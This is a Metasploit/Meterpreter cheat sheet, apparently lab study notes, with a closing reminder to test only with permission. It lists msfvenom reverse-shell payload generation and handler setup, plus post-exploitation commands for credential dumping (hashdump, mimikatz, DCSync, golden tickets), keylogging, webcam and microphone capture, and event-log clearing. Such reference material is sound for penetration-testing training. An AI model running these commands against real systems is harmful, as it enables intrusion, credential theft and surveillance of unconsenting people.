# Cheatsheet — Metasploit Meterpreter

| Area | Command / Example | Purpose |
|---|---:|---|
| **Start / Console** | `msfconsole` | Launch Metasploit console |
| **Search modules** | `search <term>` / `search type:auxiliary <svc>` / `search portscan` | Find modules by keyword, type, CVE, platform |
| **Use module** | `use <module>` or `use <index>` | Enter module context |
| **Module info** | `info` or `info <module>` | View detailed module metadata & caveats |
| **Show options** | `show options` | List module required/optional settings |
| **Show payloads** | `show payloads` | List payloads compatible with current exploit |
| **Set option** | `set RHOSTS 10.10.10.5` | Set module-scoped option |
| **Set global** | `setg LHOST 10.10.44.70` | Make option persist across modules |
| **Unset / Flush** | `unset RHOSTS` / `unsetg LHOST` / `unset all` | Remove one/global/all settings |
| **Run / Exploit** | `exploit` or `run` | Launch module |
| **Run & background** | `exploit -z` | Launch and immediately background session |
| **Safe probe** | `check` | Probe target for vulnerability without exploiting (if supported) |
| **Back / Exit context** | `back` | Leave module context |
| **Help / usage** | `help` / `help <command>` | Show console help or command usage |
| **History** | `history` | Show previous msfconsole commands |
| **Execute local shell** | `exec: <command>` or type `ls` | Run OS commands from msfconsole (limited) |
| **Run Nmap locally** | `nmap -sS <target>` | Run Nmap from msfconsole (exec) |
| **DB status** | `db_status` | Show PostgreSQL connection status |
| **Init DB (system)** | `systemctl start postgresql` / `sudo -u postgres msfdb init` | Start PostgreSQL and initialise msf DB (non-root) |
| **Workspaces** | `workspace` / `workspace -a name` / `workspace name` / `workspace -d name` / `workspace -v` / `workspace -D` / `workspace -r` / `workspace -h` | Manage project workspaces |
| **db_nmap** | `db_nmap -sV -p- 10.10.12.0/24` | Run Nmap and import results into Metasploit DB |
| **DB import/export/connect** | `db_import <file>` / `db_export <file>` / `db_connect <conn>` / `db_disconnect` / `db_save` / `db_remove` / `db_rebuild_cache` | DB management (import scans, save connections, rebuild cache) |
| **Query hosts/services** | `hosts` / `services` / `hosts -h` / `services -h` | List DB-stored hosts & services |
| **Populate RHOSTS from DB** | (inside module) `hosts -R` | Load saved DB hosts into module `RHOSTS` |
| **Query specific services** | `services -S <name>` | Search DB services (e.g., `services -S netbios`) |
| **Search modules by CVE/type** | `search cve:2017 type:exploit` | Filter search results |
| **Sessions list** | `sessions` or `sessions -l` | List active sessions |
| **Interact session** | `sessions -i <id>` | Attach to a session |
| **Run command on session** | `sessions -c 'whoami' -i <id>` | Execute command on session non-interactively |
| **Background session** | `background` (from session) or `CTRL+Z` | Send interactive session to background |
| **Session options** | `sessions -d` / `sessions -k <id>` / `sessions -K` / `sessions -u <id>` / `sessions -s <script> -i <id>` / `sessions -n <id> <name>` / `sessions -v` / `sessions -x` / `sessions -t <secs>` / `sessions -S <filter>` | Manage/terminate/upgrade/run scripts on sessions |
| **Show payload space** | `show options` (after `set PAYLOAD`) | Reveal payload-specific options (eg. LHOST/LPORT) |
| **Set payload** | `set PAYLOAD <payload/name>` | Choose payload for exploit or handler |
| **Msfvenom list** | `msfvenom -l payloads` / `msfvenom --list formats` | List available payloads / output formats |
| **Generate payload** | `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> > file` | Create payload (examples: `-f exe`, `-f elf`, `-f raw`) |
| **Encode payload** | `-e <encoder>` (e.g., `-e php/base64`) | Encode/obfuscate payload (no AV guarantee) |
| **Make file executable** | `chmod +x rev_shell.elf` | Set execute permission on UNIX payloads |
| **Handler (catch shells)** | `use exploit/multi/handler` → `set payload <name>` → `set LHOST <ip>` → `set LPORT <port>` → `run` | Listen for reverse callbacks (Meterpreter/shell) |
| **Multi-handler defaults** | `exploit/multi/handler` supports staged & stageless payloads | Use for msfvenom reverse payloads |
| **ZIP/RAR/SSH converters (context)** | `zip2john`, `rar2john`, `ssh2john` | (From John room) convert archives/keys into hashes — mentioned only for cross-tool workflow |
| **Meterpreter: show help** | (inside Meterpreter) `help` or `?` | Show Meterpreter command categories & commands |
| **Meterpreter: core** | `background` / `exit` / `guid` / `help` / `info` / `irb` / `load <ext>` / `migrate <pid>` / `run <script>` | Session control, extensions & migration |
| **Meterpreter: filesystem** | `ls` / `cd <dir>` / `pwd` / `search -f <name>` / `download <file>` / `upload <file>` / `edit <file>` / `rm <file>` | File browsing & transfer |
| **Meterpreter: networking** | `ifconfig` / `netstat` / `arp` / `route` / `portfwd add <lhost> <lport> <rhost> <rport>` | Network enumeration & port forwarding |
| **Meterpreter: system** | `ps` / `getpid` / `getuid` / `sysinfo` / `execute -f <cmd>` / `kill <pid>` / `pkill <name>` / `reboot` / `shutdown` / `clearev` / `getsystem` | Process, privilege and system control |
| **Meterpreter: credentials & forensics** | `hashdump` / `load kiwi` → `creds_all`, `creds_msv`, `dcsync`, `dcsync_ntlm`, `kerberos_ticket_list` / `golden_ticket_create` | Dump SAM/LSASS, perform DCSync or Kerberos ops (Kiwi/mimikatz) |
| **Meterpreter: UI / media** | `screenshot` / `webcam_list` / `webcam_snap` / `webcam_stream` / `record_mic <secs>` / `screenshare` | Capture desktop, webcam, mic (if supported) |
| **Meterpreter: keystroke & monitoring** | `keyscan_start` / `keyscan_stop` / `keyscan_dump` / `idletime` / `screenshare` | Keylogging & user monitoring |
| **Meterpreter: shell & escape** | `shell` → OS shell; return to Meterpreter with `CTRL+Z` / `background` | Full OS shell when required |
| **Meterpreter: scripting & extensions** | `load python` / `python_execute "<code>"` / `load kiwi` / `irb` / `bgrun <script>` | Run Python code, Kiwi (mimikatz), Ruby REPL, background scripts |
| **File search / forensic** | `search -f <pattern>` / `search -d <dir> -f <pattern>` | Find files quickly (flags, configs, creds) |
| **Port forwarding (example)** | `portfwd add -l 8080 -p 80 -r 10.10.0.5` | Forward local port to remote service through session |
| **Privilege escalation helpers** | `getsystem` / `migrate` / `load kiwi` → `privilege` related commands | Try elevation techniques & use extensions for deeper ops |
| **Post modules (run from msfconsole / meterpreter)** | `run post/<module>` or `run post/windows/gather/enum_shares` | Run post-exploitation modules/scripts |
| **Logging / reproducibility** | Record: workspace, module path, options, payload, msfvenom command, session IDs, artifacts | Essential for reporting and repeatability |
| **Safety / ethics reminder** | Test only in authorized labs or with explicit permission | Avoid destructive actions on production systems |
